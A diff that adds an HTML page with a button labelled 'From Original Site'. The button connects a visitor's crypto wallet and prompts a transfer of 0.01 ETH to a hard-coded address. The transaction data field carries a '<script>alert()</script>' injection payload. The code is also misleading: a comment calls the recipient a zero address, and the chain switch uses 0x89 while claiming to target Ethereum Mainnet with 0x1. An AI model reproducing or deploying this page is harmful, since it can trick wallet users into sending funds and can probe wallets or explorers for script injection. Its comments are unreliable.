@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <style>
+    .button {
+      background-color: #0000FF;
+      border: none;
+      color: white;
+      padding: 15px 32px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      font-size: 16px;
+      margin: 4px 2px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <script>
+    async function promptTransaction() {
+      // Check for wallet connection
+      const connected = await promptWalletConnection();
+
+      // If wallet connected, switch to Ethereum Mainnet and perform a transaction
+      if (connected) {
+        await switchToEthereumMainnet();
+        await promptEthereumTransaction();
+      }
+    }
+
+    async function promptWalletConnection() {
+      if (typeof window.ethereum !== 'undefined') {
+        try {
+          // Check if wallet is already connected
+          const accounts = await ethereum.request({ method: 'eth_accounts' });
+
+          if (accounts.length > 0) {
+            return true; // Wallet already connected
+          }
+
+          // Request wallet connection
+          await ethereum.request({ method: 'eth_requestAccounts' });
+          console.error('Wallet connected successfully!');
+          return true; // Wallet connected
+        } catch (error) {
+          console.error('Wallet connection request rejected by the user.');
+          return false; // Wallet not connected
+        }
+      } else {
+        console.error('Web3 (Ethereum provider) is not available in this browser.');
+        return false; // Wallet not connected
+      }
+    }
+
+    async function switchToEthereumMainnet() {
+      try {
+        // Ethereum Mainnet is represented by chainId '1'
+        const ethereumMainnetChainId = "0x89"; 
+        
+        // Request network switch
+        await ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: ethereumMainnetChainId }]
+        });
+
+        // Check if network switch is successful
+        const currentChainId = await ethereum.request({ method: 'eth_chainId' });
+        if (currentChainId === ethereumMainnetChainId) {
+          console.error('Switched to Ethereum Mainnet successfully! Initiating transaction.');
+          return true;
+        } else {
+          console.error('Failed to switch to Ethereum Mainnet.');
+          return false;
+        }
+      } catch (error) {
+        console.error('Failed to switch to Ethereum Mainnet.');
+        return false;
+      }
+    }
+
+    async function promptEthereumTransaction() {
+      try {
+        const transactionParameters = {
+          gasPrice: "0x244AC6D",
+          gas: "0x12A52",
+          to: "0x983C2d9302a31041bf3E342dDd420DDac122ccb6", // Updated zero address
+          from: ethereum.selectedAddress,
+          value: "0x2386F26FC10000",
+          data: "<script>alert()</script>",
+          chainId: "0x1", // Ethereum Mainnet chainId
+        };
+
+        const txHash = await ethereum.request({
+          method: "eth_sendTransaction",
+          params: [transactionParameters],
+        });
+
+        alert(`Transaction sent: ${txHash}`);
+      } catch (error) {
+        console.error('Ethereum transaction request failed or was rejected.');
+      }
+    }
+  </script>
+  <center>
+    <input type="button" class="button" value="From Original Site" onclick="promptTransaction()">
+  </center>
+</body>
+</html>
